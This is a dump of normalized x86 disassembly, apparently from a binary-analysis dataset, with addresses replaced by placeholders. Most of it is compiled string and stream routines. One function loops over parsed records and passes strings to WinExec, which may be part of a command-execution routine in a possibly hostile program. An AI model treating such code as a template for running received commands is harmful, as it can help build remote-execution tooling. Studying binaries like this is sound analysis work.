cmp [ ebp - 0xa8 ] 0x10
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x44 ] 0xf
jb r-xdata
push [ ebp - 0x58 ]
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0xc8 ]
push eax
lea edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x40 ]
call sub_40a100
add esp 0x4
test al al
je r-xdata
push [ ebp - 0xe0 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0xcc ] 0x10
jb r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
dec ecx
and ecx [ edx + 0x8 ]
mov eax [ eax + ecx * 4 ]
lea ecx [ ebp - 0x88 ]
cmp ecx eax
je r-xdata
mov eax [ eax ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
push [ ebp - 0xbc ]
call j_sub_417912#2
add esp 0x4
mov edx r--data
lea ecx [ ebp - 0x40 ]
call sub_40e490
test al al
je r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x70 ]
call sub_401630
jmp r-xdata
cmp [ ebp - 0xe4 ] 0x10
mov [ ebp - 0xcc ] 0xf
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xe0 ] 0x0
jb r-xdata
push [ ebp - 0xe0 ]
call j_sub_417912#2
add esp 0x4
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_40c7e0
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
push 0xffffffff
push 0x0
push eax
call sub_401500
push r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xc1 ] 0x1
call sub_407fa0
lea eax [ ebp - 0xc1 ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_40f6d0
push eax
lea ecx [ ebp - 0x40 ]
call sub_40b1b0
lea ecx [ ebp - 0x128 ]
call sub_401490
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x5
call sub_408000
lea eax [ ebp - 0xc8 ]
push eax
lea edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x40 ]
call sub_40a100
add esp 0x4
test al al
je r-xdata
cmp [ ebp - 0xfc ] 0x10
mov [ ebp - 0xe4 ] 0xf
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xf8 ] 0x0
jb r-xdata
push [ ebp - 0xf8 ]
call j_sub_417912#2
add esp 0x4
mov edx r--data
lea ecx [ ebp - 0x40 ]
call sub_40e490
test al al
je r-xdata
push r--data
lea ecx [ ebp - 0x70 ]
call sub_4014c0
jmp r-xdata
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x114 ] 0x10
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
jb r-xdata
push [ ebp - 0x110 ]
call j_sub_417912#2
add esp 0x4
push r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xc1 ] 0x1
call sub_407fa0
lea eax [ ebp - 0xc1 ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_40f6d0
push eax
lea ecx [ ebp - 0x40 ]
call sub_40b1b0
lea ecx [ ebp - 0x128 ]
call sub_401490
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x5
call sub_408000
lea eax [ ebp - 0xc8 ]
push eax
lea edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x40 ]
call sub_40a100
add esp 0x4
test al al
je r-xdata
push ecx
push rw-data
lea eax [ ebp - 0x128 ]
push eax
call sub_410360
mov esi eax
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x12
call sub_40e4f0
add esp 0x4
push esi
mov edx eax
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x13
call sub_40e5e0
mov esi eax
lea eax [ ebp - 0x28 ]
add esp 0x4
cmp eax esi
je r-xdata
push [ ebp - 0x128 ]
call j_sub_417912#2
add esp 0x4
mov edx r--data
lea ecx [ ebp - 0x40 ]
call sub_40e490
test al al
je r-xdata
push r--data
lea ecx [ ebp - 0x70 ]
call sub_4014c0
jmp r-xdata
cmp [ ebp - 0xcc ] 0x10
jb r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push r--data
lea ecx [ ebp - 0x58 ]
call sub_4014c0
push r--data
lea ecx [ ebp - 0x70 ]
call sub_4014c0
push r--data
lea ecx [ ebp - 0x58 ]
call sub_40b1f0
push r--data
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0xc8 ] 0x6581
call sub_40b1f0
cmp [ ebp - 0xe4 ] 0x10
mov [ ebp - 0xcc ] 0xf
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xe0 ] 0x0
jb r-xdata
push [ ebp - 0xe0 ]
call j_sub_417912#2
add esp 0x4
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_40c7e0
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x114 ] 0x10
mov [ ebp - 0xe4 ] 0xf
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xf8 ] 0x0
jb r-xdata
push [ ebp - 0xf8 ]
call j_sub_417912#2
add esp 0x4
push ecx
push rw-data
lea eax [ ebp - 0x128 ]
push eax
call sub_410360
mov esi eax
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x14
call sub_40e4f0
add esp 0x4
push esi
mov edx eax
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x15
call sub_40e5e0
mov esi eax
lea eax [ ebp - 0x28 ]
add esp 0x4
cmp eax esi
je r-xdata
push [ ebp - 0x128 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0xcc ] 0x10
jb r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0xe4 ] 0x10
mov [ ebp - 0xcc ] 0xf
mov [ ebp - 0xd0 ] 0x0
mov [ ebp - 0xe0 ] 0x0
jb r-xdata
push [ ebp - 0xe0 ]
call j_sub_417912#2
add esp 0x4
push esi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_40c7e0
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
mov [ ebp - 0x4 ] 0xe
cmp [ ebp - 0x114 ] 0x10
mov [ ebp - 0xe4 ] 0xf
mov [ ebp - 0xe8 ] 0x0
mov [ ebp - 0xf8 ] 0x0
jb r-xdata
push [ ebp - 0xf8 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x14 ] 0x10
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
push eax
call sub_4136d0
mov esi eax
mov [ ebp - 0xfc ] 0xf
cmp [ esi ] 0x0
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
jne r-xdata
push [ ebp - 0x128 ]
call j_sub_417912#2
add esp 0x4
mov ecx esi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ ebp - 0x110 ]
call sub_401630
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_40c7e0
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
push esi
call sub_417912
add esp 0x4
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0xc0 ]
call sub_401260
mov edx r--data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x16
call sub_40e790
test al al
je r-xdata
push [ ebp - 0x110 ]
call j_sub_417912#2
add esp 0x4
push 0x9
push r--data
lea ecx [ ebp - 0xa0 ]
call sub_401630
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x74 ] 0x10
mov [ ebp - 0x8c ] 0xf
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0xa0 ] 0x0
jb r-xdata
push [ ebp - 0xa0 ]
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0xa0 ]
push eax
mov ecx edi
call sub_40b140
cmp [ ebp - 0x8c ] 0x10
jb r-xdata
call sub_40ba00
jmp r-xdata
cmp [ ebp - 0x14 ] 0x10
mov [ ebp - 0x74 ] 0xf
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x88 ] 0x0
jb r-xdata
push [ ebp - 0x88 ]
call j_sub_417912#2
add esp 0x4
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
push [ ebp - 0x28 ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x2c ] 0x10
jb r-xdata
sub_40aca0
push ebp
mov ebp esp
push 0xffffffff
push sub_4306e3
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1ab4
call sub_421de0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea ecx [ ebp - 0x1a28 ]
call sub_40a1e0
push sub_409c80
push sub_40b0d0
push 0x80
push 0x34
lea eax [ ebp - 0x1a10 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4190b3
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp - 0x1a14 ]
mov ebx [ ebp - 0x1a28 ]
lea ecx [ ebp - 0x1a28 ]
cmp edi 0x10
cmovae ecx ebx
push 0x0
mov edx r--data
call sub_408880
mov esi [ ebp - 0x1a18 ]
add esp 0x4
test eax eax
jne r-xdata
sete al
test al al
sete al
test al al
je r-xdata
xor eax eax
test esi esi
setne al
test eax eax
push sub_409c80
push 0x80
push 0x34
lea eax [ ebp - 0x1a10 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_41911b
cmp [ ebp - 0x1a14 ] 0x10
jb r-xdata
cmp edi 0x10
lea ecx [ ebp - 0x1a28 ]
mov eax 0x9
cmovae ecx ebx
cmp esi eax
cmovb eax esi
push eax
mov edx r--data
call sub_408880
add esp 0x4
test eax eax
jne r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
push [ ebp - 0x1a28 ]
call j_sub_417912#2
add esp 0x4
sete al
test al al
sete al
test al al
je r-xdata
cmp esi 0x9
jae r-xdata
lea edx [ ebp - 0x1a28 ]
lea ecx [ ebp - 0x1a10 ]
call sub_409cd0
mov [ ebp - 0x1a48 ] eax
test eax eax
jle r-xdata
xor eax eax
cmp esi 0x9
setne al
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x1a88 ]
mov [ ebp - 0x1abc ] eax
lea edi [ ebp - 0x1a10 ]
lea esp [ esp ]
test eax eax
cmp [ ebp - 0x1a58 ] 0x10
jb r-xdata
cmp [ ebp - 0x1a58 ] 0x10
jb r-xdata
cmp [ ebp - 0x1a70 ] 0x10
mov [ ebp - 0x1a58 ] 0xf
mov [ ebp - 0x1a5c ] 0x0
mov [ ebp - 0x1a6c ] 0x0
jb r-xdata
push [ ebp - 0x1a6c ]
call j_sub_417912#2
add esp 0x4
cmp [ ebp - 0x1a70 ] 0x10
mov [ ebp - 0x1a58 ] 0xf
mov [ ebp - 0x1a5c ] 0x0
mov [ ebp - 0x1a6c ] 0x0
jb r-xdata
push [ ebp - 0x1a6c ]
call j_sub_417912#2
add esp 0x4
mov eax [ edi ]
cmp eax 0x1
jne r-xdata
push [ ebp - 0x1a84 ]
call j_sub_417912#2
add esp 0x4
add edi 0x34
dec [ ebp - 0x1a48 ]
jne r-xdata
push [ ebp - 0x1a84 ]
jmp r-xdata
cmp eax 0x2
je r-xdata
push ebx
lea ecx [ ebp - 0x1aa0 ]
call sub_40e7f0
add esp 0x4
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov eax [ edi ]
lea ebx [ edi + 0x4 ]
push 0xffffffff
lea esi [ ebx + 0x18 ]
mov [ ebp - 0x1a88 ] eax
push 0x0
lea eax [ esi - 0x18 ]
push eax
lea ecx [ ebp - 0x1a84 ]
mov [ ebp - 0x1a70 ] 0xf
mov [ ebp - 0x1a74 ] 0x0
mov [ ebp - 0x1a84 ] 0x0
call sub_401500
push 0xffffffff
mov [ ebp - 0x4 ] 0x2
push 0x0
push esi
lea ecx [ ebp - 0x1a6c ]
mov [ ebp - 0x1a58 ] 0xf
mov [ ebp - 0x1a5c ] 0x0
mov [ ebp - 0x1a6c ] 0x0
call sub_401500
lea eax [ ebp - 0x1a6c ]
push eax
lea eax [ ebp - 0x1a4c ]
mov [ ebp - 0x4 ] 0x1
mov esi [ rw-data ]
push eax
call sub_40ceb0
cmp [ ebp - 0x1a4c ] esi
je r-xdata
call j_sub_417912#2
add esp 0x4
lea eax [ ebp - 0x1a40 ]
push eax
call sub_410580
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x1a2c ] 0x8
lea eax [ ebp - 0x1a40 ]
cmovae eax [ ebp - 0x1a40 ]
push eax
lea ecx [ ebp - 0x1aa0 ]
call sub_407fa0
push ecx
lea eax [ ebp - 0x1aa0 ]
push eax
lea eax [ ebp - 0x1ab8 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_410360
push 0x0
push ecx
push eax
push ebx
mov [ ebp - 0x4 ] 0x5
call sub_411410
cmp [ ebp - 0x1aa4 ] 0x10
mov bl al
jb r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push eax
call [ WinExec@IAT ]
cmp eax 0x1f
seta bl
cmp [ ebp - 0x1a8c ] 0x10
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x1a8c ] 0x8
mov [ ebp - 0x1aa4 ] 0xf
mov [ ebp - 0x1aa8 ] 0x0
mov [ ebp - 0x1ab8 ] 0x0
jb r-xdata
push [ ebp - 0x1ab8 ]
call j_sub_417912#2
add esp 0x4
test bl bl
je r-xdata
push [ ebp - 0x1aa0 ]
call j_sub_417912#2
add esp 0x4
test bl bl
je r-xdata
push [ ebp - 0x1aa0 ]
call j_sub_417912#2
add esp 0x4
lea esi [ edi + 0x1c ]
mov ecx esi
call sub_409820
push esi
mov ecx rw-data
call sub_40d180
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1a2c ] 0x8
jb r-xdata
cmp [ edi ] 0x2
lea eax [ ebp - 0x1a41 ]
push eax
lea eax [ ebp - 0x1a40 ]
push eax
mov [ ebp - 0x1a41 ] 0x0
je r-xdata
push [ ebp - 0x1a40 ]
call sub_410a30
test al al
je r-xdata
mov [ ebp - 0x1a41 ] 0x1
lea esi [ edi + 0x1c ]
mov ecx esi
call sub_409820
push esi
mov ecx rw-data
call sub_40d180
sub_40b140
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
cmp [ esi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
inc eax
je r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov eax edi
pop edi
mov [ esi ] 0x0
pop esi
pop ebp
retn 0x4
push eax
push esi
push edi
call sub_4170d0
add esp 0xc
jmp r-xdata
sub_40b1b0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp esi [ ebp + 0x8 ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] 0x0
call sub_40c7e0
push [ esi ]
call j_sub_417912#2
add esp 0x4
sub_40b1f0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
mov edx esi
push edi
lea edi [ edx + 0x1 ]
xor edx edx
push edx
push esi
call sub_40d810
pop esi
pop ebp
retn 0x4
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx edi
pop edi
push edx
push esi
call sub_40d810
pop esi
pop ebp
retn 0x4
sub_40b270
push ebp
mov ebp esp
push 0xffffffff
push sub_430930
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov eax [ esi ]
xor edi edi
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] esi
mov ecx [ eax + esi + 0x38 ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x20 ] esi
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] 0x0
sete al
mov [ ebp - 0x1c ] al
mov [ ebp - 0x4 ] 0x1
test al al
jne r-xdata
mov ecx [ eax + esi + 0x3c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov ecx [ ecx + esi + 0x38 ]
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edi 0x4
jmp r-xdata
call sub_40b3f0
mov eax [ ecx ]
push 0xa
call [ eax + 0xc ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
jmp r-xdata
mov edx [ ecx + 0x30 ]
mov eax [ edx ]
test eax eax
jle r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x1
dec eax
mov [ edx ] eax
mov ecx [ ecx + 0x20 ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
mov [ edx ] 0xa
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call j_sub_41c24d
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40d980
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
call [ edx + 0x8 ]
push 0x0
call sub_408e40
sub_40b33e
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov eax [ edx + ecx + 0xc ]
add edx ecx
or eax 0x4
cmp [ edx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ edx + 0xc ] eax
test [ edx + 0x10 ] eax
je r-xdata
or eax 0x4
mov eax r-xdata
retn
push 0x1
mov ecx edx
call sub_408e40
sub_40b3f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_430840
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax esi
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov [ esp + 0xc ] esi
call [ eax + 0x4 ]
mov [ esp + 0x20 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] 0x0
sete al
mov [ esp + 0x10 ] al
mov [ esp + 0x20 ] 0x1
test al al
je r-xdata
mov ecx [ eax + esi + 0x3c ]
test ecx ecx
je r-xdata
mov [ esp + 0x20 ] 0xffffffff
call j_sub_41c24d
test al al
jne r-xdata
mov ecx [ ecx + esi + 0x38 ]
mov eax [ ecx ]
call [ eax + 0x34 ]
cmp eax 0xffffffff
jne r-xdata
call sub_40b3f0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40d980
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x8 ]
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_408e40
sub_40b520
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x1c ]
mov ecx [ esi + 0x2c ]
mov edx [ ecx ]
cmp edx 0x1
jle r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
or eax eax
pop esi
retn
test eax eax
je r-xdata
lea eax [ edx - 0x1 ]
mov [ ecx ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
inc ecx
mov [ eax ] ecx
mov eax [ esi ]
mov ecx esi
pop esi
jmp [ eax + 0x18 ]
mov eax [ esi + 0x2c ]
cmp [ eax ] 0x0
jg r-xdata
mov ecx [ esi + 0x2c ]
mov eax [ ecx ]
test eax eax
jle r-xdata
movzx eax [ ecx ]
pop esi
retn
dec eax
mov [ ecx ] eax
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
movzx eax [ edx ]
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_40b5c0
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x2c ]
dec [ eax ]
mov ecx [ esi + 0x1c ]
pop esi
mov edx [ ecx ]
lea eax [ edx + 0x1 ]
mov [ ecx ] eax
movzx eax [ edx ]
retn
or eax eax
pop esi
retn
sub_40b5f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x10 ]
push esi
xorps xmm0 xmm0
push edi
mov [ esp + 0x14 ] ecx
movlpd [ esp + 0x18 ] xmm0
test ebx ebx
jl r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi [ ebp + 0xc ]
jg r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
test edi edi
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ecx ]
call [ eax + 0x1c ]
cmp eax 0xffffffff
je r-xdata
jg r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
inc ecx
add [ esp + 0x10 ] 0x1
mov [ ecx - 0x1 ] al
mov [ ebp + 0x8 ] ecx
adc [ esp + 0xc ] 0x0
mov ecx [ esp + 0x14 ]
add edi 0xffffffff
adc ebx 0xffffffff
cmp ebx eax
jg r-xdata
test esi esi
je r-xdata
call sub_40cd40
mov esi eax
mov eax edx
mov [ esp + 0x18 ] eax
test eax eax
jl r-xdata
jl r-xdata
test esi esi
je r-xdata
jl r-xdata
test edi edi
jne r-xdata
add [ ebp + 0x8 ] esi
add [ esp + 0x10 ] esi
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
adc [ esp + 0xc ] eax
sub edi esi
sbb ebx eax
mov eax [ ecx + 0x2c ]
sub [ eax ] esi
mov eax [ ecx + 0x1c ]
add [ eax ] esi
jmp r-xdata
mov ecx [ esp + 0x14 ]
push esi
mov eax [ ecx + 0x1c ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_41a1a0
add esp 0xc
mov esi edi
mov [ esp + 0x18 ] ebx
cmp edi esi
jae r-xdata
test ebx ebx
jg r-xdata
sub_40b700
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x10 ]
push esi
xorps xmm0 xmm0
push edi
mov [ esp + 0x14 ] ecx
movlpd [ esp + 0x18 ] xmm0
test ebx ebx
jl r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi [ ebp + 0xc ]
jg r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
test edi edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esp + 0x14 ]
movzx eax [ esi ]
mov edx [ ecx ]
push eax
call [ edx + 0xc ]
cmp eax 0xffffffff
je r-xdata
jg r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ esp + 0x14 ]
inc esi
add [ esp + 0x10 ] 0x1
mov [ ebp + 0x8 ] esi
adc [ esp + 0xc ] 0x0
add edi 0xffffffff
adc ebx 0xffffffff
cmp ebx eax
jg r-xdata
test esi esi
je r-xdata
call sub_40cd60
mov esi eax
mov eax edx
mov [ esp + 0x18 ] eax
test eax eax
jl r-xdata
jl r-xdata
test esi esi
je r-xdata
jl r-xdata
test edi edi
jne r-xdata
add [ ebp + 0x8 ] esi
add [ esp + 0x10 ] esi
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
adc [ esp + 0xc ] eax
sub edi esi
sbb ebx eax
mov eax [ ecx + 0x30 ]
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
add [ eax ] esi
jmp r-xdata
mov ecx [ esp + 0x14 ]
push esi
mov eax [ ecx + 0x20 ]
push [ ebp + 0x8 ]
push [ eax ]
call sub_41a1a0
add esp 0xc
mov esi edi
mov [ esp + 0x18 ] ebx
cmp edi esi
jae r-xdata
test ebx ebx
jg r-xdata
sub_40b890
push ebp
mov ebp esp
push esi
mov esi ecx
cmp esi [ ebp + 0x8 ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_40cd80
push [ esi ]
call j_sub_417912#2
add esp 0x4
sub_40b8d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4304b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x0
call sub_40ceb0
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
add eax 0x20
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] 0x0
call sub_401500
mov [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40e8b0
cmp [ ebp - 0x20 ] 0x10
mov esi [ eax ]
jb r-xdata
lea eax [ esi + 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
